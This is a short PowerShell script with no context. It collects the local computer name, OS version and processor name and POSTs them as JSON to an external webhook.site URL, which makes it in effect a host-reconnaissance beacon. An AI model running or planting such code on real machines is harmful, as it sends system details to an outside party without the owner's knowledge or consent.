$jsonData = @{
    "ComputerName" = $env:COMPUTERNAME
    "OS" = (Get-WmiObject -Class Win32_OperatingSystem).Caption
    "Processor" = (Get-WmiObject -Class Win32_Processor).Name
} | ConvertTo-Json

Invoke-WebRequest -Uri "https://webhook.site/91df8830-246b-47e1-854f-349d2cf870da" -Method Post -Body $jsonData -ContentType "application/json"
